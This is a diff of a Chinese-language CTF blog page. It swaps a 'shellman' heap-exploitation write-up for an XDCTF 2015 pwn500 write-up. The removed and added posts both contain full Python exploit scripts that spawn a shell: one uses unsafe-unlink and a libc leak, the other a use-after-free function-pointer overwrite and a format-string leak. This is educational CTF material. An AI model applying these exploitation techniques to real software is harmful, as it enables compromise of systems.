@@ -84,22 +84,29 @@
 
 
 
-<meta name="description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
+<meta name="description" content="Conclusion同样是本地测试
+分析的时候首先要把程序中用到的一些结构体的定义搞清楚，容易发现在show score中，会调用exam结构体的一个函数指针，看到这点比较容易想到利用UAF来修改这个函数指针完成一些事情。
+但是这个UAF的bug我找了好久也没发现在哪里，还是基本功太不扎实了，后来还是参考了@fdu-sixstars的writeup
+关键在于在free一个essay后，如何让这个存">
 <meta property="og:type" content="article">
-<meta property="og:title" content="qiangwang-qual-2015-shellman">
-<meta property="og:url" content="http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/index.html">
+<meta property="og:title" content="xdctf-qual-2015-pwn500">
+<meta property="og:url" content="http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn500/index.html">
 <meta property="og:site_name" content="Icemakr's Blog">
-<meta property="og:description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
-<meta property="og:updated_time" content="2016-08-17T07:58:38.000Z">
+<meta property="og:description" content="Conclusion同样是本地测试
+分析的时候首先要把程序中用到的一些结构体的定义搞清楚，容易发现在show score中，会调用exam结构体的一个函数指针，看到这点比较容易想到利用UAF来修改这个函数指针完成一些事情。
+但是这个UAF的bug我找了好久也没发现在哪里，还是基本功太不扎实了，后来还是参考了@fdu-sixstars的writeup
+关键在于在free一个essay后，如何让这个存">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/1.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/2.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/4.jpg">
+<meta property="og:image" content="http://0byjwzsf.me/images/xdctf-qual-2015-pwn500/3.jpg">
+<meta property="og:updated_time" content="2016-08-18T15:51:35.000Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="qiangwang-qual-2015-shellman">
-<meta name="twitter:description" content="练习用
-Conclusion利用how2heap中提到的unsafe-unlink2的技巧，通过泄露libc来调用system
-Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORED(RAW, &apos;green&apos;)target  = &apos;./shellman.b400c663a0ca53f1f6c6fcbf60def">
+<meta name="twitter:title" content="xdctf-qual-2015-pwn500">
+<meta name="twitter:description" content="Conclusion同样是本地测试
+分析的时候首先要把程序中用到的一些结构体的定义搞清楚，容易发现在show score中，会调用exam结构体的一个函数指针，看到这点比较容易想到利用UAF来修改这个函数指针完成一些事情。
+但是这个UAF的bug我找了好久也没发现在哪里，还是基本功太不扎实了，后来还是参考了@fdu-sixstars的writeup
+关键在于在free一个essay后，如何让这个存">
 
 
 
@@ -120,9 +127,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
 
 
-  <link rel="canonical" href="http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/"/>
+  <link rel="canonical" href="http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn500/"/>
 
-  <title> qiangwang-qual-2015-shellman | Icemakr's Blog </title>
+  <title> xdctf-qual-2015-pwn500 | Icemakr's Blog </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -292,7 +299,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
             
               
-                qiangwang-qual-2015-shellman
+                xdctf-qual-2015-pwn500
               
             
           </h1>
@@ -304,8 +311,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               <i class="fa fa-calendar-o"></i>
             </span>
             <span class="post-meta-item-text">发表于</span>
-            <time itemprop="dateCreated" datetime="2016-07-21T00:00:00+08:00" content="2016-07-21">
-              2016-07-21
+            <time itemprop="dateCreated" datetime="2016-08-18T00:00:00+08:00" content="2016-08-18">
+              2016-08-18
             </time>
           </span>
 
@@ -334,8 +341,8 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
             
               <span class="post-comments-count">
                 &nbsp; | &nbsp;
-                <a href="/2016/07/21/qiangwang-qual-2015-shellman/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/07/21/qiangwang-qual-2015-shellman/" itemprop="commentsCount"></span>
+                <a href="/2016/08/18/xdctf-qual-2015-pwn500/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2016/08/18/xdctf-qual-2015-pwn500/" itemprop="commentsCount"></span>
                 </a>
               </span>
             
@@ -358,10 +365,23 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
       
 
       
-        <p>练习用</p>
-<h2 id="Conclusion">Conclusion</h2><p>利用<a href="https://github.com/shellphish/how2heap" target="_blank" rel="external">how2heap</a>中提到的<code>unsafe-unlink2</code>的技巧，通过泄露libc来调用system</p>
-<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">c_read  = COLORED(RAW, <span class="string">'blue'</span>)</span><br><span class="line">c_write = COLORED(RAW, <span class="string">'green'</span>)</span><br><span class="line">target  = <span class="string">'./shellman.b400c663a0ca53f1f6c6fcbf60defa8d'</span></span><br><span class="line">io      = zio(target, print_read = c_read, print_write = c_write, timeout = <span class="number">100000</span>)</span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007b0])    # new</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x400790])     # delete</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007a0])     # edit</span></span><br><span class="line">io.gdb_hint([<span class="number">0x4007a7</span>])     <span class="comment"># edit finish</span></span><br><span class="line"><span class="comment">#io.gdb_hint([0x4007c0])     # list</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">list_shellcode</span><span class="params">()</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'SHELLC0DE 0: '</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">new_shellcode</span><span class="params">(shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Length of new shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode(in raw format): '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit_shellcode</span><span class="params">(index, shellcode)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'3'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line">    io.read_until(<span class="string">'Length of shellcode: '</span>)</span><br><span class="line">    io.writeline(str(len(shellcode)))</span><br><span class="line">    io.read_until(<span class="string">'Enter your shellcode: '</span>)</span><br><span class="line">    io.writeline(shellcode)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">del_shellcode</span><span class="params">(index)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'&gt; '</span>)</span><br><span class="line">    io.writeline(<span class="string">'4'</span>)</span><br><span class="line">    io.read_until(<span class="string">'Shellcode number: '</span>)</span><br><span class="line">    io.writeline(str(index))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'A'</span> * <span class="number">0x90</span>)</span><br><span class="line">new_shellcode(<span class="string">'B'</span> * <span class="number">0x90</span>)</span><br><span class="line"></span><br><span class="line">adr_shellcode0  = <span class="number">0x6016d0</span></span><br><span class="line"></span><br><span class="line">fake0   =   l64(<span class="number">0x30</span>)</span><br><span class="line">fake0   +=  l64(<span class="number">0x91</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">3</span>)</span><br><span class="line">fake0   +=  l64(adr_shellcode0 - <span class="number">0x8</span> * <span class="number">2</span>)</span><br><span class="line">fake0   =   fake0.ljust(<span class="number">0x90</span>, <span class="string">'A'</span>)</span><br><span class="line">fake1   =   l64(<span class="number">0x90</span>)</span><br><span class="line">fake1   +=  l64(<span class="number">0xa0</span>)</span><br><span class="line">payload = fake0 + fake1</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, payload)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line"></span><br><span class="line">got_free    = <span class="number">0x601600</span></span><br><span class="line">edit_shellcode(<span class="number">0</span>, <span class="string">'A'</span> * <span class="number">0x8</span> + l64(<span class="number">0x1</span>) + l64(<span class="number">0x8</span>) + l64(got_free))</span><br><span class="line">list_shellcode()</span><br><span class="line"></span><br><span class="line">adr_free        = l64(io.read(<span class="number">0x10</span>).decode(<span class="string">'hex'</span>))</span><br><span class="line">offset_free     = <span class="number">0x82df0</span></span><br><span class="line">libc_base       = adr_free - offset_free</span><br><span class="line">offset_system   = <span class="number">0x46640</span></span><br><span class="line">adr_system      = libc_base + offset_system</span><br><span class="line"></span><br><span class="line">edit_shellcode(<span class="number">0</span>, l64(adr_system))</span><br><span class="line"></span><br><span class="line">new_shellcode(<span class="string">'/bin/sh\x00'</span>)</span><br><span class="line">del_shellcode(<span class="number">1</span>)</span><br><span class="line">    </span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
-
+        <h2 id="Conclusion">Conclusion</h2><p>同样是本地测试</p>
+<p>分析的时候首先要把程序中用到的一些结构体的定义搞清楚，容易发现在<code>show score</code>中，会调用exam结构体的一个函数指针，看到这点比较容易想到利用UAF来修改这个函数指针完成一些事情。</p>
+<p>但是这个UAF的bug我找了好久也没发现在哪里，还是基本功太不扎实了，后来还是参考了<a href="https://github.com/sixstars/CTF/blob/master/2015/XDCTF/PWN/500/writeup/README.md" target="_blank" rel="external">@fdu-sixstars</a>的writeup</p>
+<p>关键在于在<code>free</code>一个essay后，如何让这个存放在exam结构体中的essay的指针不被清零（这样就可以通过cheat来修改essay），之后再次<code>take exam</code>时，使得刚<code>malloc</code>出来的用来存放exam结构体的内存与之前的essay为同一块地方，这样只要通过修改之前的essay，就可以达到修改刚获得的exam结构体的内容，从而利用<code>show score</code>，来实现任意函数的调用</p>
+<p>现在的问题就是如何使得essay指针不被清零，可以看看<code>resit</code>的代码(IDA反编译后)，程序是在判断exam结构体的essay的长度是否为0来决定要不要将<code>essay</code>置零</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/1.jpg" alt=""></p>
+<p>在<code>exam</code>结构体中的函数指针所指向的用来获得score的代码如下所示，通过判断score是否小于60来决定要不要将essay释放。</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/2.jpg" alt=""></p>
+<p>因此只要想办法使得我们输入essay后，在保证score低于60的情况下，仍能使得<code>essay+4</code>为0即可</p>
+<p>程序首先会将输入的字符串通过fputs函数放到stream里</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/4.jpg" alt=""></p>
+<p>然后通过fread函数存放到essay中</p>
+<p><img src="/images/xdctf-qual-2015-pwn500/3.jpg" alt=""></p>
+<p>因此只要在输入的essay的开头放上一个<code>NULL</code>字符，即会被fputs截断，这样就可以成功使得<code>essay+4</code>为0</p>
+<p>到了这里后，接下去的思路就自己能很容易想出来了，利用printf函数的fsb漏洞，泄露栈上<code>libc_start_main_ret</code>的地址，然后通过<a href="https://github.com/niklasb/libc-database" target="_blank" rel="external">libc-database</a>搜索libc，在得到了<code>system</code>函数地址后，利用<code>system(&quot;/bin/sh;junk&quot;)</code>这样的trick就可以成功getshel了</p>
+<h2 id="Exploit">Exploit</h2><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> zio <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">target  = <span class="string">'./jwc'</span></span><br><span class="line">io      = zio(target, print_read = COLORED(RAW, <span class="string">'blue'</span>), print_write = COLORED(RAW, <span class="string">'green'</span>), timeout = <span class="number">10000</span>)</span><br><span class="line"></span><br><span class="line">io.gdb_hint([<span class="number">0x401624</span>])</span><br><span class="line"></span><br><span class="line"><span class="comment"># student                       (0xf0)</span></span><br><span class="line"><span class="comment"># name      0x00    -   0x0f    (0x10)</span></span><br><span class="line"><span class="comment"># intro     0x11    -   0xd8    (0xc8)</span></span><br><span class="line"><span class="comment"># math      0xe0    -   0xe7    (0x08)</span></span><br><span class="line"><span class="comment"># english   0xe8    -   0xef    (0x08)</span></span><br><span class="line"><span class="comment"># dota      0xf0    -   0xe7    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># exam                          (0x60)</span></span><br><span class="line"><span class="comment"># exam_type 0x00    -   0x03    (0x04)</span></span><br><span class="line"><span class="comment"># essay_len 0x04    -   0x07    (0x04)</span></span><br><span class="line"><span class="comment"># exam_size 0x08    -   0x0b    (0x04)</span></span><br><span class="line"><span class="comment"># essay_ptr 0x10    -   0x17    (0x08)</span></span><br><span class="line"><span class="comment"># score_fun 0x18    -   0x1f    (0x08)</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># essay                         (size)</span></span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">register</span><span class="params">(name, introduce)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1'</span>)</span><br><span class="line">    io.read_until(<span class="string">'your name, no more than 16 chars'</span>)</span><br><span class="line">    io.writeline(name)</span><br><span class="line">    io.read_until(<span class="string">'with no more than 200 chars to introduce yourself'</span>)</span><br><span class="line">    io.writeline(introduce)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exam</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'2'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.read_until(<span class="string">'length of your essay?'</span>)</span><br><span class="line">    io.writeline(str(len(essay)))</span><br><span class="line">    io.read_until(<span class="string">'OK'</span>)</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">resit</span><span class="params">(idx)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'5'</span>)</span><br><span class="line">    io.read_until(<span class="string">'3.dota'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">cheat</span><span class="params">(idx, essay)</span>:</span></span><br><span class="line">    io.read_until(<span class="string">'6.exit'</span>)</span><br><span class="line">    io.writeline(<span class="string">'1024'</span>)</span><br><span class="line">    io.read_until(<span class="string">'here you can cheat :'</span>)</span><br><span class="line">    io.writeline(str(idx))</span><br><span class="line">    io.writeline(essay)</span><br><span class="line"></span><br><span class="line">register(<span class="string">'A'</span> * <span class="number">0x10</span>, <span class="string">'B'</span> * <span class="number">200</span>)</span><br><span class="line">exam(<span class="number">1</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line">resit(<span class="number">1</span>)</span><br><span class="line">exam(<span class="number">2</span>, <span class="string">'\x00'</span>.ljust(<span class="number">0x68</span>, <span class="string">'A'</span>))</span><br><span class="line"></span><br><span class="line">plt_printf  = <span class="number">0x4009b0</span></span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'%11$lx'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(plt_printf))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line">io.read_until(<span class="string">'math'</span>)</span><br><span class="line">io.read_line()</span><br><span class="line">adr_libc_start_main_ret = int(io.read(<span class="number">12</span>), <span class="number">16</span>)</span><br><span class="line">off_libc_start_main_ret = <span class="number">0x21ec5</span>   <span class="comment"># ./find __libc_start_main ec5; ./dump libc6_2.19-0ubuntu6.6_amd64</span></span><br><span class="line">adr_libc_base   = adr_libc_start_main_ret - off_libc_start_main_ret</span><br><span class="line">off_system      = <span class="number">0x46640</span></span><br><span class="line">adr_system      = off_system + adr_libc_base</span><br><span class="line">cheat(<span class="number">1</span>, <span class="string">'/bin/sh;'</span>.ljust(<span class="number">0x18</span>, <span class="string">'A'</span>) + l64(adr_system))</span><br><span class="line">io.writeline(<span class="string">'3'</span>)</span><br><span class="line"></span><br><span class="line">io.interact()</span><br></pre></td></tr></table></figure>
+<h2 id="Referance">Referance</h2>
       
     </div>
 
@@ -394,17 +414,13 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
         <div class="post-nav">
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2016/07/21/def-con-qual-2016-babyfirst/" rel="next" title="def-con-qual-2016-babyfirst">
-                <i class="fa fa-chevron-left"></i> def-con-qual-2016-babyfirst
+              <a href="/2016/08/17/xdctf-qual-2015-pwn300/" rel="next" title="xdctf-qual-2015-pwn300">
+                <i class="fa fa-chevron-left"></i> xdctf-qual-2015-pwn300
               </a>
             
           </div>
 
           <div class="post-nav-prev post-nav-item">
-            
-              <a href="/2016/07/24/pwnable-rookiss-brainfuck/" rel="prev" title="pwnable.kr-rookiss-bf">
-                pwnable.kr-rookiss-bf <i class="fa fa-chevron-right"></i>
-              </a>
             
           </div>
         </div>
@@ -536,7 +552,7 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
               
             
             
-              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li></ol></div>
+              <div class="post-toc-content"><ol class="nav"><li class="nav-item nav-level-2"><a class="nav-link" href="#Conclusion"><span class="nav-number">1.</span> <span class="nav-text">Conclusion</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Exploit"><span class="nav-number">2.</span> <span class="nav-text">Exploit</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Referance"><span class="nav-number">3.</span> <span class="nav-text">Referance</span></a></li></ol></div>
             
           </div>
         </section>
@@ -663,9 +679,9 @@ Exploitfrom zio import *c_read  = COLORED(RAW, &apos;blue&apos;)c_write = COLORE
 
     <script type="text/javascript">
       var disqus_shortname = '0byjwzsf';
-      var disqus_identifier = '2016/07/21/qiangwang-qual-2015-shellman/';
-      var disqus_title = "qiangwang-qual-2015-shellman";
-      var disqus_url = 'http://0byjwzsf.me/2016/07/21/qiangwang-qual-2015-shellman/';
+      var disqus_identifier = '2016/08/18/xdctf-qual-2015-pwn500/';
+      var disqus_title = "xdctf-qual-2015-pwn500";
+      var disqus_url = 'http://0byjwzsf.me/2016/08/18/xdctf-qual-2015-pwn500/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
